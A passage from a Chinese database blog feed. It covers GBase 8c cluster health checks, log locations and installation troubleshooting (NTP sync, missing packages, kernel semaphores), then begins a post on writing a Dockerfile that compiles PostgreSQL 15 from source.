<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gs_check -i CheckCPU -L</span><br><span class="line"></span><br><span class="line">2023-03-19 16:21:10 [NAM] CheckCPU</span><br><span class="line">2023-03-19 16:21:10 [STD] 检查主机CPU占用率，如果idle 大于30%,或者 iowait 小于 30%.则检查项通过，否则检查项不通过</span><br><span class="line">2023-03-19 16:21:10 [RST] OK</span><br><span class="line"></span><br><span class="line">2023-03-19 16:21:10 [RAW]</span><br><span class="line">Linux 3.10.0-1160.83.1.el7.x86_64 (gbase8c_1.shawnyan.com)     03/19/23     _x86_64_    (2 CPU)</span><br><span class="line"></span><br><span class="line">16:21:05        CPU     %user     %nice   %system   %iowait    %steal     %idle</span><br><span class="line">16:21:06        all     10.05      0.00      5.29      0.00      0.00     84.66</span><br><span class="line">16:21:07        all     17.89      0.00     11.05      0.00      0.00     71.05</span><br><span class="line">16:21:08        all     11.92      0.00      3.63      0.00      0.00     84.46</span><br><span class="line">16:21:09        all     14.58      0.00      5.73      0.00      0.00     79.69</span><br><span class="line">16:21:10        all     12.11      0.00      2.63      0.00      0.00     85.26</span><br><span class="line">Average:        all     13.31      0.00      5.66      0.00      0.00     81.03</span><br></pre></td></tr></table></figure></div>
<ul>
<li>CPU 超线程是否开启</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gs_check -i CheckHyperThread</span><br><span class="line">Parsing the check items config file successfully</span><br><span class="line">Distribute the context file to remote hosts successfully</span><br><span class="line">Start to health check for the cluster. Total Items:1 Nodes:3</span><br><span class="line"></span><br><span class="line">Checking...               [=========================] 1/1</span><br><span class="line">Start to analysis the check result</span><br><span class="line">CheckHyperThread............................NG</span><br><span class="line">The item run on 3 nodes.  ng: 3</span><br><span class="line">The ng[gbase8c_1.shawnyan.com,gbase8c_2.shawnyan.com,gbase8c_3.shawnyan.com] value:</span><br><span class="line">Hyper-threading is down.</span><br><span class="line"></span><br><span class="line">Analysis the check result successfully</span><br><span class="line">Failed.    All check items run completed. Total:1     NG:1  </span><br><span class="line">For more information please refer to /home/gbase/gbase_db/om_89583529/script/gspylib/inspection/output/CheckReport_202303195907865608.tar.gz</span><br></pre></td></tr></table></figure></div>
<h3 id="13-使用-GBase-8c-提供的-gs-checkperf-工具检查数据库性能状态">13. 使用 GBase 8c 提供的 gs_checkperf 工具检查数据库性能状态</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ gs_checkperf -i pmk -U gbase</span><br><span class="line">Cluster statistics information:</span><br><span class="line">    Host CPU busy time ratio                     :    10.04      %</span><br><span class="line">    MPPDB CPU time % in busy time                :    100.00     %</span><br><span class="line">    Shared Buffer Hit ratio                      :    99.39      %</span><br><span class="line">    In-memory sort ratio                         :    100.00     %</span><br><span class="line">    Physical Reads                               :    3191</span><br><span class="line">    Physical Writes                              :    769</span><br><span class="line">    DB size                                      :    153        MB</span><br><span class="line">    Total Physical writes                        :    357</span><br><span class="line">    Active SQL count                             :    4</span><br><span class="line">    Session count                                :    13</span><br><span class="line">[gbase@gbase8c_1 ~]$</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-05.png"
                      alt="" loading="lazy"
                ></p>
<h3 id="14-查看各组件日志">14. 查看各组件日志</h3>
<ul>
<li>GTM</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/gbase/gbase_db/log/pg_log/gtm1</span><br><span class="line">tailf postgresql-2023-03-16_000000.log</span><br></pre></td></tr></table></figure></div>
<ul>
<li>CN</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/gbase/gbase_db/log/pg_log/cn1</span><br><span class="line">tailf postgresql-2023-03-16_000000.log</span><br></pre></td></tr></table></figure></div>
<ul>
<li>DN</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/gbase/gbase_db/log/pg_log/dn1_1</span><br><span class="line">tailf postgresql-2023-03-16_000000.log</span><br></pre></td></tr></table></figure></div>
<h3 id="15-查看审计日志">15. 查看审计日志</h3>
<ul>
<li>CN 节点</li>
</ul>
<p>日志在 <code>/home/gbase/gbase_db/log/pg_audit/cn1</code> 目录下，日志会按时间字段轮转，需要按需查找。<br>
示例如下，</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-06.png"
                      alt="" loading="lazy"
                ></p>
<h3 id="16-查看-gbase-相关服务">16. 查看 gbase 相关服务</h3>
<p>使用 systemctl 查看当前运行的 gbase 服务</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl list-units | grep -i gbase</span><br></pre></td></tr></table></figure></div>
<ul>
<li>gtm/gha/cn</li>
</ul>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-07.png"
                      alt="" loading="lazy"
                ></p>
<ul>
<li>dn</li>
</ul>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-08.png"
                      alt="" loading="lazy"
                ></p>
<h3 id="17-启停数据节点">17. 启停数据节点</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gha_ctl start datanode -l http://192.168.8.31:2379 GROUP_NAME dn2_1</span><br><span class="line">gha_ctl stop datanode -l http://192.168.8.31:2379 GROUP_NAME dn2_1</span><br><span class="line"></span><br><span class="line">systemctl start datanode_gbase_dn2_1</span><br><span class="line">systemctl stop datanode_gbase_dn2_1</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-09.png"
                      alt="" loading="lazy"
                ></p>
<h2 id="常见问题">常见问题</h2>
<h3 id="1-80000209-–-ntpd-同步异常">1. 80000209 – ntpd 同步异常</h3>
<ul>
<li>现象：</li>
</ul>
<p>安装时报错：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gbase@gbase8c 1 script$ ./gha ctl install -c gbase -p /home/gbase/gbase package</span><br><span class="line">&quot;ret&quot;:80000209，&#x27;msg&quot;:&quot;Timestamp diff too largel</span><br><span class="line">gbase@gbase8c 1 script$</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-10.png"
                      alt="" loading="lazy"
                ></p>
<ul>
<li>分析：</li>
</ul>
<p>从各节点同时取时间戳，差距较大，大于 2.5。时间不同步，可能会导致全局时间戳 TSO 失效。</p>
<ul>
<li>解决：</li>
</ul>
<p>在三个节点分别检查 ntpd 服务的同步情况：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ timedatectl</span><br><span class="line">      Local time: Mon 2023-03-20 21:13:02 CST</span><br><span class="line">  Universal time: Mon 2023-03-20 13:13:02 UTC</span><br><span class="line">        RTC time: Mon 2023-03-20 13:13:02</span><br><span class="line">       Time zone: Asia/Shanghai (CST, +0800)</span><br><span class="line">     NTP enabled: no</span><br><span class="line">NTP synchronized: no</span><br><span class="line"> RTC in local TZ: no</span><br><span class="line">      DST active: n/a</span><br><span class="line"></span><br><span class="line">[gbase@gbase8c_1 ~]$ systemctl status ntpd</span><br><span class="line">● ntpd.service - Network Time Service</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/ntpd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Wed 2023-03-15 00:45:31 CST; 5 days ago</span><br><span class="line"> Main PID: 773 (ntpd)</span><br><span class="line">    Tasks: 1</span><br><span class="line">   CGroup: /system.slice/ntpd.service</span><br><span class="line">           └─773 /usr/sbin/ntpd -u ntp:ntp -g</span><br></pre></td></tr></table></figure></div>
<p>同时在三个节点执行命令 (<code>date +%s.%N</code>)，查看是否存在时间差。</p>
<p>如 ntpd 同步异常，可以将三个节点统一修改同步源：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mv /etc/ntp.conf /etc/ntp.conf.bak0320</span><br><span class="line">sudo vi /etc/ntp.conf</span><br><span class="line"></span><br><span class="line">driftfile  /var/lib/ntp/drift</span><br><span class="line">pidfile   /var/run/ntpd.pid</span><br><span class="line">logfile /var/log/ntp.log</span><br><span class="line">restrict    default kod nomodify notrap nopeer noquery</span><br><span class="line">restrict -6 default kod nomodify notrap nopeer noquery</span><br><span class="line">restrict 127.0.0.1</span><br><span class="line">server 127.127.1.0</span><br><span class="line">fudge  127.127.1.0 stratum 10</span><br><span class="line">server ntp.aliyun.com iburst minpoll 4 maxpoll 10</span><br><span class="line">restrict ntp.aliyun.com nomodify notrap nopeer noquery</span><br><span class="line"></span><br><span class="line">sudo systemctl restart ntpd</span><br><span class="line">systemctl status ntpd</span><br><span class="line">timedatectl</span><br></pre></td></tr></table></figure></div>
<p>等 5s 再次检查后，发现 ntpd 同步成功：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ timedatectl</span><br><span class="line">      Local time: Mon 2023-03-20 21:34:06 CST</span><br><span class="line">  Universal time: Mon 2023-03-20 13:34:06 UTC</span><br><span class="line">        RTC time: Mon 2023-03-20 13:34:06</span><br><span class="line">       Time zone: Asia/Shanghai (CST, +0800)</span><br><span class="line">     NTP enabled: yes</span><br><span class="line">NTP synchronized: yes</span><br><span class="line"> RTC in local TZ: no</span><br><span class="line">      DST active: n/a</span><br><span class="line">[gbase@gbase8c_1 ~]$ </span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-11.png"
                      alt="" loading="lazy"
                ></p>
<p>再次检查时间差，发现小于 1：</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-12.png"
                      alt="" loading="lazy"
                ></p>
<p>再次执行安装命令，即可安装成功！</p>
<p>Ps. 特殊情况下，如果是内网，还没有 ntp 服务器的情况下，有一种取巧的办法可以快速使三个节点时间保持一致，<br>
三个节点<strong>同时</strong>执行命令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo timedatectl set-ntp no ; sudo timedatectl set-time &quot;2023-03-20 21:18:45&quot; ; sudo timedatectl set-ntp yes ; date +%s.%N</span><br></pre></td></tr></table></figure></div>
<h3 id="2-gsql-command-not-found…">2. gsql: command not found…</h3>
<ul>
<li>现象：</li>
</ul>
<p>安装完成后，直接使用 gsql 提示命令未找到。同：<a href="https://shawnyan.cn/2023/gbase/gbase-8c-install/#%E5%BC%82%E5%B8%B8%E9%94%99%E8%AF%AF">快速搭建 GBase 8c 集群环境</a> – 异常错误2</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 script]$ gsql -d postgres -p 5432</span><br><span class="line">bash: gsql: command not found...</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-13.png"
                      alt="" loading="lazy"
                ></p>
<ul>
<li>原因：</li>
</ul>
<p>环境变量未生效。</p>
<ul>
<li>解决：</li>
</ul>
<p>退出当前用户，再重新进入 gbase 用户即可。或直接引入环境变量 （<code>source ~/.bashrc</code>）。</p>
<h3 id="3-当前版本不支持-redhat">3. 当前版本不支持 redhat</h3>
<p>从配置文件 <code>/home/gbase/gbase_package/package_info.json</code> 可以看出当前版本的 GBase 8c 支持 CentOS、麒麟、统信、欧拉、Debian 操作系统，但尚未适配 redhat。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-14.jpg"
                      alt="" loading="lazy"
                ></p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-15.png"
                      alt="" loading="lazy"
                ></p>
<h3 id="4-真的有个包叫-patch">4. 真的有个包叫 patch</h3>
<ul>
<li>现象：</li>
</ul>
<p>安装时遇到报错：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host localhost install or upgrade dependency [&#x27;patch&#x27;: None] failed!</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-16.png"
                      alt="" loading="lazy"
                ></p>
<ul>
<li>解决：</li>
</ul>
<p>安装依赖包 <code>patch</code> 即可解决！</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install -y patch</span><br></pre></td></tr></table></figure></div>
<p>该程序将 diff 文件应用于原始文件。diff 命令用于比较原始文件和已更改的文件。Diff列出了对文件所做的更改。</p>
<p>其他所需依赖包可参考： <a href="https://shawnyan.cn/2023/gbase/gbase-8c-install/">快速搭建 GBase 8c 集群环境</a> – <strong>确认依赖包已经安装</strong></p>
<h3 id="5-“Failed-to-obtain-host-name-”">5. “Failed to obtain host name.”</h3>
<ul>
<li>现象：</li>
</ul>
<p>host name 获取失败。</p>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-17.jpg"
                      alt="" loading="lazy"
                ></p>
<ul>
<li>分析：</li>
</ul>
<p>用命令 <code>hostname</code> 采集主机名时失败，可能是 hostname 设定问题，也可能是 gbase.yaml 中的 IP 配置项错填。</p>
<ul>
<li>解决：</li>
</ul>
<ol>
<li><code>hostnamectl</code> 重新检查主机名。</li>
<li>仔细检查 gbase.yaml 中的各个 IP 是否正确填写。</li>
</ol>
<h3 id="6-SEMMNI-信号量不足问题">6. SEMMNI 信号量不足问题</h3>
<ul>
<li>现象：</li>
</ul>
<p>安装过程中可能报错提示 “check install env and os setting On systemwide basis, the maximum number of SEMMNI is not correct. the current SEMMNI value is: 128. Please check it…”</p>
<ul>
<li>解决：</li>
</ul>
<p>执行 <code>sudo vi /etc/sysctl.conf</code> 配置系统内核参数， 避免信号量不足无法初始化。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kernel.sem = 40960 2048000 40960 20480</span><br></pre></td></tr></table></figure></div>
<h3 id="7-机器重启后可能会遇到-80000301-错误">7. 机器重启后可能会遇到 80000301 错误</h3>
<p>错误样式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gha_ctl monitor -l http://192.168.8.31:2379</span><br><span class="line">&#123;</span><br><span class="line">    &quot;ret&quot;:80000301,</span><br><span class="line">    &quot;msg&quot;:&quot;Transport endpoint unreach&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>分析原因：</p>
<ol>
<li>机器是否使用固定IP，不要使用自动分配IP，IP地址变化会影响服务正常启动。</li>
<li>确认时间是否同步，三台机器是否有时间差。确认ntpd服务运行情况。</li>
<li>确认etcd服务运行情况。</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[gbase@gbase8c_1 ~]$ systemctl status etcd</span><br><span class="line">● etcd.service - Etcd Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/etcd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Wed 2023-03-15 00:53:29 CST; 2 weeks 0 days ago</span><br><span class="line"> Main PID: 9095 (etcd)</span><br><span class="line">   CGroup: /system.slice/etcd.service</span><br><span class="line">           └─9095 /usr/bin/etcd --name=node_0 --data-dir=/var/lib/etcd/default.etcd --listen-client-urls=http://192.168.8.31:2379</span><br><span class="line">[gbase@gbase8c_1 ~]$ </span><br></pre></td></tr></table></figure></div>
<h3 id="9999-其他可能存在的问题">9999. 其他可能存在的问题</h3>
<ol>
<li>互信未正确配置</li>
</ol>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-18.jpg"
                      alt="" loading="lazy"
                ></p>
<p>解决办法：</p>
<p>检查或重新配置互信：参考 <a href="https://shawnyan.cn/2023/gbase/gbase-8c-install/">快速搭建 GBase 8c 集群环境</a> – <strong>3. 配置 gbase 用户 ssh 互信</strong></p>
<ol start="2">
<li>安装使用的 gbase.yaml 文件存在格式问题（如，对齐问题，漏、错填配置项）</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GhaExecuteError[status.ENOTEXIST.code()], Status.ENOTEXIST.msg(config_file))</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/img/loading.svg"
                     data-src="/2023/gbase/gbase-8c-cmd-problem/2023-03-19-19.jpg"
                      alt="" loading="lazy"
                ></p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/619360" >https://www.modb.pro/db/619360 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>GBase</category>
        <category>GBase 8c</category>
      </categories>
      <tags>
        <tag>gbase</tag>
        <tag>gdca</tag>
        <tag>南大通用</tag>
        <tag>gbase 8c</tag>
      </tags>
  </entry>
  <entry>
    <title>【PG15】【番外篇】自定义 Dockerfile 构建 PostgreSQL 15 编译版 Docker 镜像</title>
    <url>/2023/postgresql/pg-15-compile-with-dockerfile/</url>
    <content><![CDATA[<h2 id="BG">BG</h2>
<p>前几日 Sean 老师发布了一篇文章 – <a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzAxODk3Nzg5Nw==&amp;mid=2247483999&amp;idx=1&amp;sn=c2f017361d5d34f389d525a77e865906" >PostgreSQL安装(一): 再简单点儿，用Docker? <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, 介绍如何快速安装启动 PostgreSQL 数据库。</p>
<p>本文再稍微延伸一点，介绍一下如何自定义 Dockerfile，加入自己想要预制的参数，构建一个自定义的 Docker Image.</p>
<img  alt="docker-plus-postgres.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230319-fa074eeb-e451-4c8a-8754-98118017d2cf.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="Dockerfile-介绍">Dockerfile 介绍</h2>
<p>Dockerfile 是用于定义 Docker 镜像的一种格式。它是一个包含了一系列指令的文本文件，每个指令对应一个镜像层的操作，用于指定如何构建 Docker 镜像。</p>
<p>以下是一个基本的 Dockerfile 示例：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用一个基础镜像</span></span><br><span class="line"><span class="string">FROM</span> <span class="string">ubuntu:latest</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新软件包列表</span></span><br><span class="line"><span class="string">RUN</span> <span class="string">apt-get</span> <span class="string">-y</span> <span class="string">update</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装软件包</span></span><br><span class="line"><span class="string">RUN</span> <span class="string">apt-get</span> <span class="string">install</span> <span class="string">-y</span> <span class="string">nginx</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制文件到容器中</span></span><br><span class="line"><span class="string">COPY</span> <span class="string">index.html</span> <span class="string">/usr/share/nginx/html/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境变量</span></span><br><span class="line"><span class="string">ENV</span> <span class="string">MY_VAR=my_value</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露端口</span></span><br><span class="line"><span class="string">EXPOSE</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行命令</span></span><br><span class="line"><span class="string">CMD</span> [<span class="string">&quot;nginx&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;daemon off;&quot;</span>]</span><br></pre></td></tr></table></figure></div>
<p>这个示例 Dockerfile 做了以下几件事：</p>
<ul>
<li>使用最新版的 Ubuntu 作为基础镜像。</li>
<li>更新软件包列表，并安装 Nginx。</li>
<li>将一个名为 index.html 的文件复制到容器的 /usr/share/nginx/html/ 目录中。</li>
<li>设置了一个名为 MY_VAR 的环境变量，其值为 my_value。</li>
<li>暴露了容器的 80 端口。</li>
<li>在容器启动时，运行 Nginx 并以守护进程模式运行。</li>
</ul>
<p>使用 Dockerfile，可以通过在 Dockerfile 所在目录执行 <code>docker build</code> 命令来构建 Docker 镜像，例如：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">docker build -t my_ngx:latest .</span><br></pre></td></tr></table></figure></div>
<p>构建结果如下：</p>
<img  alt="p1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230319-f302ad75-ab6d-4476-ad8f-68706aca7f85.png"
                      referrerpolicy="no-referrer"
                >
<p>从另一个角度讲，如果有一个 Docker Image, 想剖析一下这个镜像如何生成，这样可能做到么？</p>
<p>类似于反编译，这是有难度的，但也可以查看到蛛丝马迹，</p>
<p>比如使用 <code>docker history &lt;image&gt;</code> 命令，查看 Image 的历史。</p>
<img  alt="p2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230319-5e3db9c9-1411-4b95-91d6-44c3e7ff3bc3.png"
                      referrerpolicy="no-referrer"
                >
<p>或者其他第三方工具，比如 <a class="link"   href="https://github.com/CenturyLinkLabs/dockerfile-from-image" >dockerfile-from-image <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="自定义-PostgreSQL-15-的-Dockerfile">自定义 PostgreSQL 15 的 Dockerfile</h2>
<p>上面介绍过了 Dockerfile 的基本结构，下面就来准备 PostgreSQL 的镜像，基本步骤如下：</p>
<h3 id="1-基于-CentOS-7-的最新版构建镜像">1. 基于 CentOS 7 的最新版构建镜像</h3>
<p>上面案例中的 <code>FROM ubuntu:latest</code> 改为 <code>FROM centos:7</code> 即可。<br>
这里可以加上镜像的描述，比如维护者：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">maintainer=&quot;Shawn</span> <span class="string">Yan&quot;</span></span><br></pre></td></tr></table></figure></div>
<p>还可以加入其他系统环境变量，比如将语言设定为英文 utf8,</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">ENV</span> <span class="string">LANG=en_US.UTF-8</span></span><br></pre></td></tr></table></figure></div>
<h3 id="2-替换自带-yum-源，并安装依赖">2. 替换自带 yum 源，并安装依赖</h3>
<p>As you know, CentOS 自带的官方 yum 源连接速度十分、非常、很不理想，所以这里将原有的 repo 文件替换成我常用的 repo。</p>
<p>然后，安装必要的依赖。<br>
由于本文介绍的是构建编译版的 PostgreSQL，所以还需要安装编译工具，以及一些开发包。<br>
这里其实就会出现一个副作用，构建出来的镜像 size 肯定要比直接安装二进制包要大。</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Update yum source</span></span><br><span class="line"><span class="string">RUN</span> <span class="string">rm</span> <span class="string">-rf</span> <span class="string">/etc/yum.repos.d/*.repo</span></span><br><span class="line"><span class="string">ADD</span> <span class="string">my.repo</span> <span class="string">/etc/yum.repos.d/my.repo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install deps</span></span><br><span class="line"><span class="string">RUN</span> <span class="string">yum</span> <span class="string">-y</span> <span class="string">update</span> <span class="string">\</span></span><br><span class="line">    <span class="string">&amp;&amp;</span> <span class="string">yum</span> <span class="string">-y</span> <span class="string">install</span> <span class="string">wget</span> <span class="string">gcc</span> <span class="string">make</span> <span class="string">...</span></span><br></pre></td></tr></table></figure></div>
<p>RUN 命令上面介绍过了，ADD 是将本地文件添加到镜像中的指定位置，这里是将常用的 yum 源写入到 my.repo 再添加到镜像中。</p>
<h3 id="3-下载-PG-15-源码，并编译">3. 下载 PG 15 源码，并编译</h3>
<p>说到编译 PostgreSQL 源码，这里介绍一个参数，<code>--with-extra-version=STRING</code> ， 该参数将STRING附加到PostgreSQL版本号。例如，您可以使用它来标记从未发布的Git快照构建的二进制文件，或者包含带有额外版本字符串的自定义补丁，例如Git描述标识符或分发包发布号。</p>
<p>在 Dockerfile 中，使用 <code>RUN</code> 命令来执行动作，使用 <code>&amp;&amp;</code> 接续动作，使用 <code>\</code> 进行换行。</p>
<p>如此，下载源码，编译，安装一气呵成。</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">RUN</span> <span class="string">wget</span> <span class="string">https://mirrors.neusoft.edu.cn/postgresql/source/v$PG_VERSION/postgresql-$PG_VERSION.tar.gz</span> <span class="string">\</span></span><br><span class="line">    <span class="string">&amp;&amp;</span> <span class="string">echo</span> <span class="string">&quot;$PG_SHA256 postgresql-$PG_VERSION.tar.gz&quot;</span> <span class="string">|</span> <span class="string">sha256sum</span> <span class="string">-c</span> <span class="bullet">-</span> <span class="string">\</span></span><br><span class="line">    <span class="string">&amp;&amp;</span> <span class="string">tar</span> <span class="string">xzf</span> <span class="string">postgresql-$PG_VERSION.tar.gz</span> <span class="string">\</span></span><br><span class="line">    <span class="string">&amp;&amp;</span> <span class="string">cd</span> <span class="string">postgresql-$PG_VERSION</span> <span class="string">\</span></span><br><span class="line">    <span class="string">&amp;&amp;</span> <span class="string">./configure</span> <span class="string">--prefix=/opt/postgresql</span> <span class="string">--with-extra-version=&quot;-ShawnYan&quot;</span> <span class="string">\</span></span><br><span class="line">    <span class="string">&amp;&amp;</span> <span class="string">make</span> <span class="string">-j</span> <span class="string">$(nproc)</span> <span class="string">world</span> <span class="string">\</span></span><br><span class="line">    <span class="string">&amp;&amp;</span> <span class="string">make</span> <span class="string">install-world</span> <span class="string">\</span></span><br></pre></td></tr></table></figure></div>
<h3 id="4-创建-postgres-用户，并指定环境变量">4. 创建 postgres 用户，并指定环境变量</h3>
<p>在许多 Linux 系统中，PostgreSQL 用户的 UID 默认为 26。这是因为在过去的一些 Linux 系统中，UID 26 被保留给系统用户 postgres，该用户是PostgreSQL 数据库的默认所有者。这意味着如果你使用了默认的 PostgreSQL 安装程序，那么系统会自动为 postgres 用户分配 UID 26。<br>
按照惯例，这里也将 postgres 用户的 UID 设定为 26。并将常用的环境变量预设好，如 PGDATA, PGHOME</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">RUN</span> <span class="string">useradd</span> <span class="string">-u</span> <span class="number">26</span> <span class="string">postgres</span> <span class="string">\</span></span><br><span class="line">    <span class="string">&amp;&amp;</span> <span class="string">echo</span> <span class="string">&quot;export PGDATA=/var/lib/pgsql/15/data&quot;</span> <span class="string">&gt;&gt;</span> <span class="string">/home/postgres/.bash_profile</span> <span class="string">\</span></span><br><span class="line">    <span class="string">&amp;&amp;</span> <span class="string">echo</span> <span class="string">&quot;export PGHOME=/opt/postgresql&quot;</span> <span class="string">&gt;&gt;</span> <span class="string">/home/postgres/.bash_profile</span> <span class="string">\</span></span><br><span class="line">    <span class="string">&amp;&amp;</span> <span class="string">echo</span> <span class="string">&quot;export PATH=\$PGHOME/bin:\$PATH&quot;</span> <span class="string">&gt;&gt;</span> <span class="string">/home/postgres/.bash_profile</span> <span class="string">\</span></span><br></pre></td></tr></table></figure></div>
<h3 id="5-创建-PGDATA-目录，并初始化-PG-实例">5. 创建 PGDATA 目录，并初始化 PG 实例</h3>
<p>创建 PGDATA 路径，并将权限赋予 postgres 用户。然后在 postgres 用户下初始化实例，初始化时指定数据目录。</p>
